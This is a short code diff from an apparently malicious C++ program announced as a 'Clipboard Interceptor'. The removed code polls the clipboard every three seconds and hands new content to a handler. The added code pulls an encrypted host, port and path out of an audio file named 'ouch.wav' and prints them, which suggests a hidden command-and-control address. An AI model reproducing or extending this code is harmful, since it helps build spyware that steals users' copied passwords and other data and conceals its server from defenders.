@@ -33,24 +33,25 @@ void HandleNewData(std::wstring& data)
 }
 
 int main() {
-    // Console ouput UTF_16 format, TODO REMOVE
-    _setmode(_fileno(stdout), _O_U16TEXT);
+    std::cout << "[*] Clipboard Interceptor Started\n";
+    std::string lastClipboard = "";
 
-    std::wcout << L"[*] Clipboard Interceptor Started\n";
-    std::wstring lastClipboard = L"";
+    auto [host, port, path] = ExtractAndDecryptConfig("ouch.wav");
 
-    while(true)
-    {
-        std::wstring currentClipboard = GetClipboardText();
+    std::cout << "DECRYPTED_HOST: " + host << "\nDECRYPTED_PORT: " + port + "\nDECRYPTED_PATH: " + path << "\n";
 
-        if(!currentClipboard.empty() && currentClipboard != lastClipboard) 
-        {
-            HandleNewData(currentClipboard);  
-            lastClipboard = currentClipboard;
-        }
+    // while(true)
+    // {
+    //     std::wstring currentClipboard = GetClipboardText();
 
-        std::this_thread::sleep_for(std::chrono::seconds(3));
-    }
+    //     if(!currentClipboard.empty() && currentClipboard != lastClipboard) 
+    //     {
+    //         HandleNewData(currentClipboard);  
+    //         lastClipboard = currentClipboard;
+    //     }
+
+    //     std::this_thread::sleep_for(std::chrono::seconds(3));
+    // }
 
     return 0;
 }
